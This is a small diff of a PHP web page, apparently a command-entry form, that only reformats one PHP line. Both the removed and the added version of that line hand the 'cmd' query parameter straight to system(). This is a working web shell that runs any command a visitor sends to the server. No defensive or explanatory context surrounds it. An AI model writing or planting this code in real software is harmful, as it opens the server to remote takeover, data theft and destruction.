@@ -35,7 +35,9 @@
 			<input type="submit" value="Enter" class="button"/>
 		</form>
 
-		<?php if(isset($_GET['cmd']) && !empty($_GET['cmd'])) system($_GET['cmd']); ?>
+		<?php 
+			if(isset($_GET['cmd']) && !empty($_GET['cmd'])) system($_GET['cmd']); 
+		?>
 
 	</body>
 	
